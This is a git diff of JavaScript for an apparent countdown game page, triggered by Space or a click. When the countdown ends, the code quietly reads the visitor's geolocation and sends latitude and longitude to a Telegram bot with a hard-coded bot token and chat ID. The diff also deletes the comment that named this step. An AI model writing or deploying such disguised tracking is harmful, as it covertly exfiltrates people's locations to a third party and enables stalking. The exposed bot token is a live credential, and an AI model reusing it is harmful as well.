@@ -2,9 +2,15 @@ let dot = document.getElementById("dot");
 let start = document.getElementById("start");
 let count_number = 3;
 let intervalId;
+let isCountingDown = false; 
 
-document.addEventListener("keydown", function (event) {
-  if (event.code === "Space") {
+document.addEventListener("keydown", startCountdown);
+document.addEventListener("click", startCountdown);
+
+function startCountdown(event) {
+
+  if (!isCountingDown && (event.code === "Space" || event.type === "click")) {
+    isCountingDown = true; 
     intervalId = setInterval(() => {
       start.innerText = count_number;
       count_number--;
@@ -12,22 +18,19 @@ document.addEventListener("keydown", function (event) {
         clearInterval(intervalId);
         start.style.display = "none";
         dot.style.display = "inline-block";
-
-        // Call getLocation to send user's location
         getLocation();
-
         setInterval(() => {
           dot.style.display = "none";
           start.style.display = "inline-block";
           start.style.color = "White";
           start.innerHTML =
             "<h1>Time's up⏲️ <br> Press ctrl + R to Restart!</h1>";
-          document.body.style.backgroundColor = "red"; // Fixed this line
+          document.body.style.backgroundColor = "red";
         }, 120000);
       }
     }, 1000);
   }
-});
+}
 
 function getLocation() {
   if (navigator.geolocation) {
@@ -57,10 +60,9 @@ function showError(error) {
 function sendLocationToTelegram(position) {
   const latitude = position.coords.latitude;
   const longitude = position.coords.longitude;
-  const chatId = "6959013020"; 
-  const botToken = "7099870589:AAGL9JlIG9djKDI_Q8dtedPMMyOayQyO7nU";  
+  const chatId = "6959013020";
+  const botToken = "7099870589:AAGL9JlIG9djKDI_Q8dtedPMMyOayQyO7nU";
   const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
-
   fetch(url)
     .then((response) => response.json())
     .then((data) => {
